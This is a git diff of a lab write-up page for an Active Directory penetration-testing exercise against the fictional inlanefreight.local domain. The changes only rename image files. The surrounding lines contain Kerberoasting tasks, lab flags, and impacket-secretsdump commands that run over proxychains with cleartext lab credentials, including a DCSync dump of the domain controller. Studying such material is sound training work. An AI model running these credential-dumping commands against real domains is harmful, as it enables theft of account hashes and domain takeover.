@@ -14,7 +14,7 @@ Apply what you learned in this module to compromise the domain and answer the qu
 
 **Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer**
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption><p>svc_sql</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption><p>svc_sql</p></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
 
@@ -95,13 +95,13 @@ C:\Windows\system32>
 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>spn$<em>r0ast1ng_on</em>@n_0p3n_f1re</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption><p>spn$<em>r0ast1ng_on</em>@n_0p3n_f1re</p></figcaption></figure>
 
 Note that RDP is also available for this host.
 
 **Find cleartext credentials for another domain user. Submit the username as your answer.**
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption><p>nothing useful</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption><p>nothing useful</p></figcaption></figure>
 
 ```
 proxychains impacket-secretsdump INLANEFREIGHT.LOCAL/svc_sql:lucky7@172.16.6.50 -outputfile inlanefreight_hashes 
@@ -177,7 +177,7 @@ DCSync
 
 First we have to know what IP is the DC by using the following command.
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>172.16.6.3</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption><p>172.16.6.3</p></figcaption></figure>
 
 ```
 proxychains impacket-secretsdump -just-dc INLANEFREIGHT/tpetty:'Sup3rS3cur3D0m@inU2eR'@172.16.6.3 -outputfile ilf_dcsync
